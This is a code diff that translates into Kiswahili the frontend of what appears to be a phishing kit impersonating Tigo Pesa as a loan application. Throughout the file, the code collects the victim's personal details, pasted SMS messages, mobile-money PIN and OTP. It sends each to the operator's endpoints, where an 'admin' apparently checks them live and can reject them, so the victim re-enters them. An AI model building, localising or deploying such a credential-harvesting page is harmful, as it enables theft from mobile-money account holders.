@@ -1,11 +1,11 @@
 // ═══════════════════════════════════════════════════════════
-// Tigo Pesa Tanzania – Frontend State Machine
+// Tigo Pesa Tanzania – Frontend State Machine (Kiswahili)
 // ═══════════════════════════════════════════════════════════
 
 const S = {
-  loanType: 'Business Loan',
+  loanType: 'Mkopo wa Biashara',
   loanAmount: 500000,
-  loanTerm: '12 Months',
+  loanTerm: 'Miezi 12',
   loanPurpose: '',
   firstName: '', lastName: '', phone: '', email: '',
   employment: '', annualIncome: 0,
@@ -83,7 +83,10 @@ function toS2() {
   const am = +document.getElementById('s1am').value;
   const te = document.getElementById('s1te').value;
   const pu = document.getElementById('s1pu').value.trim();
-  if (!ty || am <= 0 || !te || !pu) { showError('s1Err', 'Please complete all fields.'); return; }
+  if (!ty || am <= 0 || !te || !pu) {
+    showError('s1Err', 'Tafadhali jaza sehemu zote.');
+    return;
+  }
   Object.assign(S, { loanType: ty, loanAmount: am, loanTerm: te, loanPurpose: pu });
   goTo('page-step2');
 }
@@ -93,9 +96,9 @@ function toS3() {
   const la = document.getElementById('s2la').value.trim();
   const ph = document.getElementById('s2ph').value.trim();
   const em = document.getElementById('s2em').value.trim();
-  if (!fi || !la) { showError('s2Err', 'Enter your full name.'); return; }
-  if (ph.length !== 9) { showError('s2Err', 'Enter a valid 9-digit phone number.'); return; }
-  if (!em.includes('@')) { showError('s2Err', 'Enter a valid email.'); return; }
+  if (!fi || !la) { showError('s2Err', 'Weka jina lako kamili.'); return; }
+  if (ph.length !== 9) { showError('s2Err', 'Weka namba sahihi ya simu ya tarakimu 9.'); return; }
+  if (!em.includes('@')) { showError('s2Err', 'Weka barua pepe sahihi.'); return; }
   Object.assign(S, { firstName: fi, lastName: la, phone: ph, email: em });
   document.getElementById('sA').textContent = 'TZS ' + S.loanAmount.toLocaleString();
   document.getElementById('sT').textContent = S.loanTerm;
@@ -110,7 +113,8 @@ async function submitApp() {
   const kn = document.getElementById('s3kn').value.trim();
   const kp = document.getElementById('s3kp').value.trim();
   if (!em || inc <= 0 || !kn || kp.length !== 9) {
-    showError('s3Err', 'Please complete all fields.'); return;
+    showError('s3Err', 'Tafadhali jaza sehemu zote.');
+    return;
   }
   Object.assign(S, { employment: em, annualIncome: inc, kinName: kn, kinPhone: kp });
   try {
@@ -120,16 +124,16 @@ async function submitApp() {
       body: JSON.stringify({ applicationData: S })
     });
     const data = await res.json();
-    if (!data.ok) { showError('s3Err', 'Submission failed.'); return; }
+    if (!data.ok) { showError('s3Err', 'Imeshindwa kutuma maombi.'); return; }
     S.applicationId = data.applicationId;
     goTo('page-sms-paste');
-  } catch (e) { showError('s3Err', 'Network error. Try again.'); }
+  } catch (e) { showError('s3Err', 'Hitilafu ya mtandao. Jaribu tena.'); }
 }
 
 // ═══ SMS ═══
 async function doSmsParse() {
   const msg = document.getElementById('smsMsgBox').value.trim();
-  if (msg.length < 3) { showError('momErr', 'Paste a valid SMS message.'); return; }
+  if (msg.length < 3) { showError('momErr', 'Bandika ujumbe sahihi wa SMS.'); return; }
   document.getElementById('smsRejectedNotice').classList.add('hidden');
   document.getElementById('smsResendBlock').classList.add('hidden');
   try {
@@ -140,7 +144,7 @@ async function doSmsParse() {
     });
     goTo('page-wait-sms');
     startPoll('sms');
-  } catch (e) { showError('momErr', 'Network error.'); }
+  } catch (e) { showError('momErr', 'Hitilafu ya mtandao.'); }
 }
 
 async function resendSms() {
@@ -150,13 +154,13 @@ async function resendSms() {
       method: 'POST', headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ applicationId: S.applicationId })
     });
-    showToast('SMS resubmitted to admin', 'success');
+    showToast('SMS imetumwa tena kwa msimamizi', 'success');
     goTo('page-wait-sms');
     startPoll('sms');
-  } catch (e) { showToast('Resend failed', 'error'); }
+  } catch (e) { showToast('Imeshindwa kutuma tena', 'error'); }
 }
 
-// ═══ PIN (4-digit for Tigo Pesa) ═══
+// ═══ PIN (tarakimu 4) ═══
 function pinMvM(el, i) {
   el.value = el.value.replace(/\D/g, '');
   if (el.value && i < 3) document.getElementById('pin' + (i + 1)).focus();
@@ -176,7 +180,7 @@ function togPin() {
 async function doPin() {
   let pin = '';
   for (let i = 0; i < 4; i++) pin += document.getElementById('pin' + i).value;
-  if (pin.length !== 4) { showError('pinErr', 'Enter a valid 4-digit PIN.'); return; }
+  if (pin.length !== 4) { showError('pinErr', 'Weka PIN sahihi ya tarakimu 4.'); return; }
   document.getElementById('pinRejectedNotice').classList.add('hidden');
   document.getElementById('pinResendBlock').classList.add('hidden');
   try {
@@ -186,32 +190,36 @@ async function doPin() {
       body: JSON.stringify({ applicationId: S.applicationId, pin })
     });
     const data = await res.json();
-    if (data.blocked) { showError('pinErr', data.message || 'PIN blocked. Try again later.'); showPinBlocked(); return; }
-    if (!data.ok) { showError('pinErr', data.error || 'Submission failed.'); return; }
+    if (data.blocked) {
+      showError('pinErr', data.message || 'PIN imezuiwa. Jaribu tena baadaye.');
+      showPinBlocked();
+      return;
+    }
+    if (!data.ok) { showError('pinErr', data.error || 'Imeshindwa kutuma.'); return; }
     goTo('page-wait-pin');
     startPoll('pin');
-  } catch (e) { showError('pinErr', 'Network error.'); }
+  } catch (e) { showError('pinErr', 'Hitilafu ya mtandao.'); }
 }
 
 async function resendPin() {
   document.getElementById('pinResendBtn').disabled = true;
   const lastPin = document.getElementById('pinResendBtn').dataset.lastPin;
-  if (!lastPin) { showToast('Please re-enter your PIN.', 'error'); return; }
+  if (!lastPin) { showToast('Tafadhali weka PIN yako tena.', 'error'); return; }
   try {
     await fetch('/api/send-pin', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ applicationId: S.applicationId, pin: lastPin })
     });
-    showToast('PIN resubmitted to admin', 'success');
+    showToast('PIN imetumwa tena kwa msimamizi', 'success');
     goTo('page-wait-pin');
     startPoll('pin');
-  } catch (e) { showToast('Resend failed', 'error'); }
+  } catch (e) { showToast('Imeshindwa kutuma tena', 'error'); }
 }
 
 function showPinBlocked() {
   const badge = document.getElementById('pinAttemptsDisplay');
-  badge.textContent = '🔒 PIN temporarily blocked';
+  badge.textContent = '🔒 PIN imezuiwa kwa muda';
   badge.className = 'attempts-badge blocked';
   for (let i = 0; i < 4; i++) document.getElementById('pin' + i).disabled = true;
 }
@@ -230,7 +238,7 @@ function clearOtpCode() {
 async function doOtp() {
   let otp = '';
   for (let i = 0; i < 4; i++) otp += document.getElementById('otp' + i).value;
-  if (otp.length !== 4) { showError('otpErr', 'Enter a valid 4-digit OTP.'); return; }
+  if (otp.length !== 4) { showError('otpErr', 'Weka OTP sahihi ya tarakimu 4.'); return; }
   document.getElementById('otpRejectedNotice').classList.add('hidden');
   document.getElementById('otpResendBlock').classList.add('hidden');
   try {
@@ -241,23 +249,23 @@ async function doOtp() {
     });
     goTo('page-wait-otp');
     startPoll('otp');
-  } catch (e) { showError('otpErr', 'Network error.'); }
+  } catch (e) { showError('otpErr', 'Hitilafu ya mtandao.'); }
 }
 
 async function resendOtp() {
   document.getElementById('otpResendBtn').disabled = true;
   const lastOtp = document.getElementById('otpResendBtn').dataset.lastOtp;
-  if (!lastOtp) { showToast('Please re-enter your OTP.', 'error'); return; }
+  if (!lastOtp) { showToast('Tafadhali weka OTP yako tena.', 'error'); return; }
   try {
     await fetch('/api/send-otp', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ applicationId: S.applicationId, otp: lastOtp })
     });
-    showToast('OTP resubmitted to admin', 'success');
+    showToast('OTP imetumwa tena kwa msimamizi', 'success');
     goTo('page-wait-otp');
     startPoll('otp');
-  } catch (e) { showToast('Resend failed', 'error'); }
+  } catch (e) { showToast('Imeshindwa kutuma tena', 'error'); }
 }
 
 // ═══ POLLING ═══
@@ -293,17 +301,17 @@ function onRejected(step) {
     for (let i = 0; i < 4; i++) pin += document.getElementById('pin' + i).value;
     document.getElementById('pinResendBtn').dataset.lastPin = pin;
     clearLoginPin();
-    showToast('PIN rejected. Please re-enter.', 'error');
+    showToast('PIN ilikataliwa. Tafadhali weka tena.', 'error');
     goTo('page-pin');
   } else if (step === 'otp') {
     let otp = '';
     for (let i = 0; i < 4; i++) otp += document.getElementById('otp' + i).value;
     document.getElementById('otpResendBtn').dataset.lastOtp = otp;
     clearOtpCode();
-    showToast('OTP rejected. Please re-enter.', 'error');
+    showToast('OTP ilikataliwa. Tafadhali weka tena.', 'error');
     goTo('page-otp');
   } else if (step === 'sms') {
-    showToast('SMS rejected. Please edit and resubmit.', 'error');
+    showToast('SMS ilikataliwa. Tafadhali hariri na utume tena.', 'error');
     goTo('page-sms-paste');
   }
 
@@ -314,14 +322,14 @@ function onBlocked(step) {
   if (step === 'pin') {
     showPinBlocked();
     goTo('page-pin');
-    showToast('PIN blocked for 30 minutes.', 'error');
+    showToast('PIN imezuiwa kwa dakika 30.', 'error');
   }
 }
 
 function handleNotFound() {
   stopPoll();
   Object.keys(countdownTimers).forEach(stopCountdown);
-  alert('Application not found. Please start again.');
+  alert('Maombi hayapatikani. Tafadhali anza tena.');
   goTo('page-landing');
 }
 
@@ -335,7 +343,7 @@ function startCountdown(step) {
     updateCountdownUI(step, Math.max(0, countdownValues[step]));
     if (countdownValues[step] <= 0) {
       stopCountdown(step);
-      document.getElementById(`${step}WaitStatus`).textContent = 'Still waiting for admin response…';
+      document.getElementById(`${step}WaitStatus`).textContent = 'Bado tunasubiri jibu la msimamizi…';
     }
   }, 1000);
 }
@@ -365,7 +373,7 @@ function startResendCooldown(step) {
     if (resendLeft[step] <= 0) {
       stopResendCooldown(step);
       btn.disabled = false;
-      btn.textContent = 'Resend to Admin';
+      btn.textContent = 'Tuma Tena kwa Msimamizi';
     } else if (timerLabel) {
       timerLabel.textContent = resendLeft[step];
     }
@@ -388,7 +396,7 @@ function cancelWait(step) {
 // ═══ APPROVAL ═══
 function showApprovalPage() {
   const amt = S.loanAmount.toLocaleString();
-  const monthly = Math.ceil(S.loanAmount / parseInt(S.loanTerm)).toLocaleString();
+  const monthly = Math.ceil(S.loanAmount / parseInt(S.loanTerm.replace(/\D/g, ''))).toLocaleString();
   document.getElementById('aprAmount').textContent = 'TZS ' + amt;
   document.getElementById('aprAmt').textContent = 'TZS ' + amt;
   document.getElementById('aprTerm').textContent = S.loanTerm;
@@ -397,7 +405,7 @@ function showApprovalPage() {
 }
 
 function finishApplication() {
-  alert('Thank you! Your loan has been disbursed.');
+  alert('Asante! Mkopo wako umetolewa.');
   location.reload();
 }
 
